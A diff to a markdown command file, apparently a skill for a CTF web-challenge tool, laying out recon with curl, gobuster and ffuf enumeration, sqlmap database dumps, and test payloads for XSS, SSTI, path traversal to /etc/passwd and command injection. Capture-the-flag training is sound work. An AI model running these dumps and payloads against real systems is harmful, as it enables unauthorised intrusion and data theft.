@@ -31,7 +31,13 @@ Use this command for challenges involving:
 
 ## Instructions
 
-1. First check tool availability: `bash scripts/check-tools.sh`
+1. Check tool availability:
+
+   ```bash
+   bash scripts/check-tools.sh
+   ```
+
+   Expected: each tool prints `[OK]`. If any show `[MISSING]`, note which are unavailable before proceeding.
 
 2. Run the web analysis:
 
@@ -39,38 +45,79 @@ Use this command for challenges involving:
    ctf run web $ARGUMENTS
    ```
 
-2. For directory/file enumeration:
+   Expected output: target URL, detected technologies, and initial observations.
+
+3. **CRITICAL: Check for low-hanging fruit first (these often contain the flag directly):**
 
    ```bash
-   # Directory brute-force
-   gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
-
-   # With extensions
-   gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
-
-   # Fast fuzzing
-   ffuf -u http://target.com/FUZZ -w wordlist.txt
+   curl -s http://target.com/robots.txt
    ```
 
-3. For SQL injection:
+   Expected: `Disallow:` entries pointing to hidden paths. Visit each disallowed path.
 
    ```bash
-   # Test URL for SQLi
-   sqlmap -u "http://target.com/page?id=1" --dbs
-
-   # Enumerate databases
-   sqlmap -u "http://target.com/page?id=1" --dbs
-
-   # Dump table
-   sqlmap -u "http://target.com/page?id=1" -D database -T table --dump
+   curl -s http://target.com/.git/HEAD
    ```
 
-4. Manual testing checklist:
-   - Check robots.txt, sitemap.xml
-   - Look for .git, .svn, backup files
-   - Test input fields for injection
-   - Examine cookies and headers
-   - View page source
+   Expected: `ref: refs/heads/main` if a git repo is exposed. If found, dump it with `git-dumper` or manual download.
+
+   ```bash
+   curl -sI http://target.com/
+   ```
+
+   Expected: HTTP headers. Look for custom headers (`X-Flag:`, `X-Secret:`), server version, and interesting cookies.
+
+   **CRITICAL: If any of the above reveal the flag, stop here. Only continue to automated tools if manual checks found nothing.**
+
+4. Directory and file enumeration:
+
+   ```bash
+   gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+   ```
+
+   Expected: list of discovered paths with status codes:
+   ```
+   /admin (Status: 200)
+   /login.php (Status: 200)
+   /backup (Status: 403)
+   ```
+
+   Visit paths with `200` and note paths with `403` (may need auth bypass). For faster fuzzing:
+
+   ```bash
+   ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
+   ```
+
+5. Test for injection vulnerabilities on discovered pages:
+
+   **SQL Injection:**
+
+   ```bash
+   sqlmap -u "http://target.com/page?id=1" --dbs
+   ```
+
+   Expected: `available databases [2]: information_schema, challenge_db`. Then dump:
+
+   ```bash
+   sqlmap -u "http://target.com/page?id=1" -D challenge_db --tables
+   ```
+
+   Expected: table names. Dump the table most likely to contain the flag:
+
+   ```bash
+   sqlmap -u "http://target.com/page?id=1" -D challenge_db -T flags --dump
+   ```
+
+   **Other injection types** — test manually:
+
+   | Vulnerability | Test payload | Expected if vulnerable |
+   |--------------|--------------|----------------------|
+   | XSS | `<script>alert(1)</script>` | Alert popup or reflected script |
+   | SSTI | `{{7*7}}` | `49` rendered in page |
+   | Path Traversal | `../../../etc/passwd` | File contents in response |
+   | Command Injection | `; id` | `uid=1000(www-data)` in output |
+
+6. **Validation: Confirm the flag.** The flag is typically found in database dumps, hidden files, server responses, or cookie values. Verify the flag format matches the expected pattern (e.g., `flag{...}`, `CTF{...}`). If no flag found, revisit step 3 — check page source, JavaScript files, and HTTP response headers more carefully.
 
 ## Common Vulnerabilities
 
